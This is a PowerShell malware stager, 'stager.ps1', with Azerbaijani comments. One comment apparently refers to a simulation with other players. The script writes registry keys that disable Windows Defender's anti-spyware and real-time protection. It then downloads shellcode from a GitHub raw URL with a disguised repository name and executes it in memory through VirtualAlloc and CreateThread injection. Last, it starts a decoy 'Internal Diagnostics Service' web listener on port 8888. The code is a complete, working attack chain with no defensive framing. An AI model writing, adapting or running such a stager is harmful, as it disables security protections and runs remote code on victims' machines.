# stager.ps1 - Main Logic Controller

# 1. Tamper Protection-ı Registry üzərindən söndürməyə cəhd (Admin olmalıdır)
try {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
    Write-Host "[*] AV rules applied."
} catch { }

# 2. GitHub-dan Payload-ı (Shellcode) endir
 $payloadUrl = "https://raw.githubusercontent.com/hellomydears/WinPerfMon-Lib/main/payload.bin"
 $shellcode = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 3. RAM-da icra et (Kernel32 Injection)
 $k32 = @"
using System; using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint t, IntPtr i);
}
"@
Add-Type -TypeDefinition $k32 -Language CSharp
 $ptr = [K32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
[K32]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# 4. Öz HTTP Serverini başlat (Simulyasiya üçün - Port 8888)
# Bu, digər oyunçuların Windows-a scan edib görməsi üçündür
Start-Job -ScriptBlock {
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://+:8888/")
    $listener.Start()
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $response = $context.Response
        $content = [System.Text.Encoding]::UTF8.GetBytes("<h1>Internal Diagnostics Service Active</h1>")
        $response.ContentLength64 = $content.Length
        $response.OutputStream.Write($content, 0, $content.Length)
        $response.OutputStream.Close()
    }
}
